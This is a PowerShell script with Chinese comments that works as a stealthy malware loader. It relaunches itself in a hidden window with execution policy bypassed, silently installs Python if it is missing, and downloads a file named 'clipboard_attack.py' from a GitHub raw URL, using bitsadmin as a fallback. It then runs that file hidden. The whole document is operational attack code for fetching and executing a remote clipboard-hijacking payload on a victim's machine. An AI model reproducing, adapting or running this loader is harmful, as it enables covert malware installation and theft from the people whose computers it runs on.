# 让 PowerShell 静默运行
$powershellPath = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
Start-Process -WindowStyle Hidden -FilePath $powershellPath -ArgumentList "-ExecutionPolicy Bypass -NoProfile -File $PSCommandPath" -PassThru
exit

# 设置执行策略为 ByPass
Set-ExecutionPolicy Bypass -Scope Process -Force

# 定义脚本下载链接和临时文件路径
$scriptUrl = "https://raw.githubusercontent.com/ethxiaoli/clipboard-setup/main/clipboard_attack.py"
$scriptPath = Join-Path $env:TEMP "clipboard_attack.py"
$pythonInstallerPath = Join-Path $env:TEMP "python_installer.exe"

# 检查 Python 是否已安装
$pythonInstalled = $false
$pythonPaths = @(
    "C:\Python37\python.exe",
    "C:\Python39\python.exe",
    "$env:LocalAppData\Programs\Python\Python37\python.exe",
    "$env:LocalAppData\Programs\Python\Python39\python.exe"
)

foreach ($path in $pythonPaths) {
    if (Test-Path $path) {
        $pythonInstalled = $true
        $pythonPath = $path
        break
    }
}

if (-not $pythonInstalled) {
    try {
        # 下载 Python 安装程序
        $pythonInstaller = "https://www.python.org/ftp/python/3.9.7/python-3.9.7-amd64.exe"
        
        Write-Host "正在下载 Python 安装程序..."
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        Invoke-WebRequest -Uri $pythonInstaller -OutFile $pythonInstallerPath

        if (Test-Path $pythonInstallerPath) {
            Write-Host "正在安装 Python..."
            $arguments = "/quiet InstallAllUsers=0 PrependPath=1 Include_test=0 Include_pip=1"
            Start-Process -FilePath $pythonInstallerPath -ArgumentList $arguments -Wait -NoNewWindow
            
            # 等待安装完成
            Start-Sleep -Seconds 30
            
            # 刷新环境变量
            $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
        }
    } catch {
        Write-Host "Python 安装失败: $_"
        exit 1
    }
}

# 下载 Python 脚本
try {
    Write-Host "正在下载目标脚本..."
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Invoke-WebRequest -Uri $scriptUrl -OutFile $scriptPath -ErrorAction Stop
} catch {
    Write-Host "使用备用下载方法..."
    Start-Process -WindowStyle Hidden -FilePath "bitsadmin" -ArgumentList "/transfer","DownloadScript",$scriptUrl,$scriptPath -Wait
}

# 运行 Python 脚本
if (Test-Path $scriptPath) {
    Write-Host "正在启动脚本..."
    Start-Process -WindowStyle Hidden -FilePath "python" -ArgumentList $scriptPath
} else {
    Write-Host "脚本下载失败"
    exit 1
}
